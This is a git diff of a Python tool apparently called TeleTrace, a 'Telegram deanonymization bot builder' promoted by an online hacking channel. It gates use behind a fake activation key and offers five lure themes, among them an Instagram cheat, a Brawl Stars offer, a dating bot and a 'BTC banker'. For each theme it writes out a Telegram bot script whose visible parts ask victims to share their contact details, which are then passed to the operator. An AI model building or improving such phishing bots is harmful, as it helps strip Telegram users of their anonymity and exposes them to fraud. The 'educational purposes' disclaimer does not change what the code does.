@@ -1,67 +1,109 @@
 import colorama
 from colorama import Fore, Back, Style
 import os
+import time
+
+correct_number = "12"
 os.system('clear')
-print(Fore.RED + '''
-         _,.-------.,_
-     ,;~'             '~;,
-   ,;                     ;,
-  ;                         ;
- ,'                         ',
-,;                           ;,
-; ;      .           .      ; ;
-| ;   ______       ______   ; |
-|  `/~"     ~" . "~     "~\'  |
-|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
- |   |        }:{        |   |
- |   l       / | \       !   |
- .~  (__,.--" .^. "--.,__)  ~.
- |     ---;' / | \ `;---     |
-  \__.       \/^\/       .__/
-   V| \                 / |V
-    | |T~\___!___!___/~T| |
-    | |`IIII_I_I_I_IIII'| |
-    |  \,III I I I III,/  |
-     \   `~~~~~~~~~~'    /
-       \   .       .   /     
-         \.    ^    ./
-           ^~~~^~~~^
-
-
-	''')
-input(Fore.GREEN + "Press Enter")
+print(' ')
+print(' ')
+print("\033[48;5;330m[\033[1m*\033[0m]\033[1;40m\033[10m OnlineHacking :\033[1;32m Join Telegram Channel \033[1;33m @OnlineHacking  !\033[0m")
+print(" ")
+time.sleep(5)
 os.system('clear')
-print(Fore.MAGENTA + ' _____    _   _   _   _ ' + Fore.YELLOW + ' __  __   ______ ')
-print(Fore.MAGENTA + '|  __ \  | \ | | | \ | |' + Fore.YELLOW + '|  \/  | |  ____|')
-print(Fore.MAGENTA + '| |  | | |  \| | |  \| |' + Fore.YELLOW + '| \  / | | |__   ')
-print(Fore.MAGENTA + '| |  | | | . ` | | . ` |' + Fore.YELLOW + '| |\/| | |  __|  ')
-print(Fore.MAGENTA + '| |__| | | |\  | | |\  |' + Fore.YELLOW + '| |  | | | |____ ')
-print(Fore.MAGENTA + '|_____/  |_| \_| |_| \_|' + Fore.YELLOW + '|_|  |_| |______|')
-print(Fore.YELLOW + '-----------------------------------------')
-print(Fore.YELLOW + '|' + Fore.BLUE +  " Telegram Deanonymization bot builder  " + Fore.YELLOW + '|')
-print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @suman333mondal         " + Fore.YELLOW + '|')
-print(Fore.YELLOW + '|' + Fore.BLUE +  "       Channel: t.me/OnlineHacking   " + Fore.YELLOW + '|')
-print(Fore.YELLOW + '-----------------------------------------')
-userid = input(Fore.RED +  "Enter your Telegram ID > ")
-token = input(Fore.BLUE +  "Enter your bot token > ")
-print(Fore.CYAN + '''
-[1] Punched the number
-[2] Instagram cheat
-[3] Brawl stars
-[4] Acquaintance
-[5] BTC BANKER
-	''')
-choice = input(Fore.MAGENTA +  "Select the fake interface option:>>> ")
-if not choice.isdigit():
-	print("Error, option must be numeric")
-	exit(0)
-choice = int(choice)
+print(" ")
+print(" ")
+print("             \033[91m|===========================|")
+print("            [¤]   \033[1;33mD I S C L A I M E R\033[91m   [¤]")
+print("             \033[91m|===========================|\n\n")
+print("\n")
+print("\033[91m[!]  \033[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of Bot Phishing are not responsible for any kind of hack and stuff.\n\n• Phishing is illegal if you are using it offensively\n\n• Developers assume NO liability and are NOT responsible for any damage caused by this program\n\n• software to test a device, company, or any other type of target without WRITTEN PERMISSION from them.\n\n")
+print("\n")
+print("\n")
+print("\033[31m[\033[32m★\033[31m]\033[93m This Tool is only for educational purposes, and we are not responsible for any kind of illegal activity done with this tool\033[0m ")
+print("\n")
+print("\n")
+input(Fore.GREEN + '\033[1;40m\033[31m[\033[32m*\033[31m]\033[96m Press Enter to Accepted Disclaimer \033[1;91m : \033[0m')
+print("\n")
+print("\n")
+os.system('clear')
+print("\n")
+print("\n")
+print("\033[33m"
+      "      ██╗  ██╗███████╗██╗   ██╗\n"
+      "      ██║ ██╔╝██╔════╝╚██╗ ██╔╝\n"
+      "      █████╔╝ █████╗   ╚████╔╝\n"
+      "      ██╔═██╗ ██╔══╝    ╚██╔╝\n"
+      "      ██║  ██╗███████╗   ██║\n"
+      "      ╚═╝  ╚═╝╚══════╝   ╚═╝    \033[0m\n")
+print("\n")
+print("\n")
+print("\033[1;33m[\033[0m\033[1;77m~\033[0m\033[1;33m]\033[0m\033[1;32m \033[92m Activation Key 100% Free. Dont Buy  \033[34m( \033[1;36mOnline Hacking \033[34m) \033[0m")
+print("\n")
+print("\033[1;33m[\033[0m\033[1;77m~\033[0m\033[1;33m]\033[0m\033[1;32m \033[95m Visit This Website Article and Scroll down and click Generate Key button \033[0m")
+print("\n")
+print("\033[91m[\033[92m*\033[91m]\033[1;93m Link :\033[0m\033[1;36m https://termux.xyz/  ")
+print("\n")
+print("\n")
 
+user_input = input(Fore.GREEN + "\033[1;40m\033[31m[\033[32m*\033[31m]\033[92m Enter Activation Key: \033[0m")
 
+if "12" in user_input:
+    print(Fore.GREEN +'\033[1;32m\n\nCorrect! You Enter a Correct Activation Key\n\n')
+    time.sleep(3)
+    os.system('clear')
+    print("\n")
+    print("\033[95m")		
+    print("    ████████╗███████╗██╗     ███████╗ ")
+    print("    ╚══██╔══╝██╔════╝██║     ██╔════╝ ")
+    print("       ██║   █████╗  ██║     █████╗  ")
+    print("       ██║   ██╔══╝  ██║     ██╔══╝  ")
+    print("       ██║   ███████╗███████╗███████╗ ")
+    print("       ╚═╝   ╚══════╝╚══════╝╚══════╝ ")
+    print("\033[0m\n\033[33m")
+    print("             ████████╗██████╗  █████╗  ██████╗███████╗")
+    print("             ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝")
+    print("                ██║   ██████╔╝███████║██║     █████╗  ")
+    print("                ██║   ██╔══██╗██╔══██║██║     ██╔══╝  ")
+    print("                ██║   ██║  ██║██║  ██║╚██████╗███████╗")
+    print("                ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝")                                      
+    print("\033[95;1m \033[0m\n")
+    print("\033[1;33m\033[0m\033[1;31m  ██████████\033[0m\033[1;37m██████████\033[1;33m\033[0m\033[0;32m██████████\033[0m \033[1;32m\033[0m\033[1;33m TELE TRACE HACKING BOT \033[0m\033[1;37m\033[0m\033[1;37m [v 1.1] \033[0m")
+    print("")
+    print("\033[1;33m\033[0m\033[1;33m  [\033[0m\033[1;32m Github :- \033[36mhttps://github.com/OnlineHacKing/TeleTrace \033[0m\033[1;32m\033[0m\033[1;33m] \033[0m")
+    print("")
+    print("\033[1;37m\033[0m\033[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\033[0m")
+    print("\033[93m    |O|n|l|i|n|e| |H|a|c|k|i|n|g|")
+    print("\033[1;37m\033[0m\033[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\033[0m")
+    print("\033[1;37m\033[0m\033[1;37m    +-+-+-+-+-+ >>\033[0m")
+    print("\033[95m    |S|U|M|A|N|")
+    print("\033[1;37m\033[0m\033[1;37m    +-+-+-+-+-+ >>\033[0m")
+    print("")
+    print("\033[96m< < < ====================================================== > > >\033[0m ")
+    print("")
+    userid = input(Fore.RED +  "\033[91m[\033[92m*\033[91m]\033[93m Enter Your Telegram Chat ID \033[96m >>> \033[0m ")
+    print("")
+    token = input(Fore.BLUE +  "\033[91m[\033[92m*\033[91m]\033[95m Enter Your Bot Token \033[96m >>> \033[0m  ")
+    print("")
+    print("\033[96m< < < ====================================================== > > >\033[0m ")
+    print("\n\033[1;31m[\033[0m\033[1;92m1\033[0m\033[1;31m] \033[0m\033[1;37;44m Punched the number \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m2\033[0m\033[1;31m] \033[0m\033[1;37;41m Instagram cheat \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m3\033[0m\033[1;31m] \033[0m\033[1;91;107m Brawl stars \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m4\033[0m\033[1;31m] \033[0m\033[1;48;5;21m Acquaintance \033[0m ")
+    print("\n\033[1;31m[\033[0m\033[1;92m5\033[0m\033[1;31m] \033[0m\033[1;48;5;200m BTC BANKER \033[0m \n ")
+    print(" ")
+    choice = input(Fore.MAGENTA +  "\033[96m\033[91m[\033[0m\033[91m *** \033[0m\033[96m]\033[0m\033[96m  Select the Fake Bot Interface Option  \033[91m >>> ")
+	
+    if not choice.isdigit():
+        print("Error, Option Must be Numeric")
+        exit(0)
 
-if choice == 1:
-	f = open('probiv.py', 'w+', encoding='utf-8')
-	f.write(f"""
+    choice = int(choice)
+
+    if choice == 1:
+        # Code for choice 1 (Punched the number)
+        f = open('probiv.py', 'w+', encoding='utf-8')
+        f.write(f"""
 import telebot
 from telebot import types
 import time
@@ -173,13 +215,14 @@ def contact(message):
 			└Address: {{random.choice(adr)}}
 			''')
 bot.polling()
-		""")
-	f.close()
-	print("The probiv.py file is saved")
+        """)
+        f.close()
+        print("The probiv.py file is saved")
 
-if choice == 2:
-	f = open('nacr.py', 'w+', encoding='utf-8')
-	f.write(f"""
+    elif choice == 2:
+        # Code for choice 2 (Instagram cheat)
+        f = open('probiv2.py', 'w+', encoding='utf-8')
+        f.write(f"""
 import telebot
 from telebot import types
 import time
@@ -308,20 +351,17 @@ def entr(message):
 	except Exception as e:
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
-
-
-
-
 bot.polling()
 
 
-		""")
-	f.close()
-	print("File nacr.py saved")
+        """)
+        f.close()
+        print("The probiv2.py file is saved")
 
-if choice == 3:
-	f = open('brawl.py', 'w+', encoding='utf-8')
-	f.write(f"""
+    elif choice == 3:
+        # Code for choice 3 (Brawl stars)
+        f = open('brawl_stars.py', 'w+', encoding='utf-8')
+        f.write(f"""
 import telebot
 from telebot import types
 import time
@@ -518,21 +558,17 @@ def entr1(message):
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
 
-
-
-
-	
-
 bot.polling()
 
 
-		""")
-	f.close()
-	print("The brawl.py file is saved")
+        """)
+        f.close()
+        print("The brawl_stars.py file is saved")
 
-if choice == 4:
-	f = open('znak.py', 'w+', encoding='utf-8')
-	f.write(f"""
+    elif choice == 4:
+        # Code for choice 4 (Acquaintance)
+        f = open('acquaintance.py', 'w+', encoding='utf-8')
+        f.write(f"""
 import telebot
 from telebot import types
 import time
@@ -623,13 +659,14 @@ def contact(message):
 		time.sleep(2)
 		bot.send_message(message.chat.id, 'Unfortunately, there were no suitable users in the database!')
 bot.polling()
-		""")
-	f.close()
-	print("znak.py file saved")
-if choice == 5:
-	f = open('btc.py', 'w+', encoding='utf-8')
-	f.write(f"""
-	
+        """)
+        f.close()
+        print("The acquaintance.py file is saved")
+
+    elif choice == 5:
+        # Code for choice 5 (BTC BANKER)
+        f = open('btc_banker.py', 'w+', encoding='utf-8')
+        f.write(f"""
 import telebot
 from telebot import types
 import time
@@ -706,9 +743,23 @@ def contact(message):
 		print(info)
 
 		if message.contact.user_id != message.chat.id:
-			bot.send_message(message.chat.id, '❌ Authorize Your contact!')
-	
+			bot.send_message(message.chat.id, '❌ Authorize Your contact!')	
 bot.polling()
-		""")
-	f.close()
-	print("btc.py file saved")
+        """)
+        f.close()
+        os.system('clear')
+        print("\n\n")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;96m\033[0m\033[1;92m  ---------------------------------   \033[1;91m\033[0m")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;90m\033[0m\033[1;92m  !!    Bot Build Successfull    !!  \033[1;91m\033[0m")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;96m\033[0m\033[1;92m  ---------------------------------   \033[1;91m\033[0m")
+        time.sleep(2)
+        print("\n")
+        print("\033[1m \033[36m[+] BTC Telegram Bot Tool is Ready \033[m \033[21")
+        print("\n")
+        print("\033[92m[+] Now Type This Command:\033[93m python btc_banker.py \033[m \n\n ")
+	
+    else:
+        print(' \n\n\033[92m[\033[94m!\033[92m]\033[92m Invalid option Try Again !! \e[0m\n\n')
+
+else:
+    print(Fore.RED +'\033[1;91m\n\nSorry, You Enter Incorrect Activation Key\n\n')
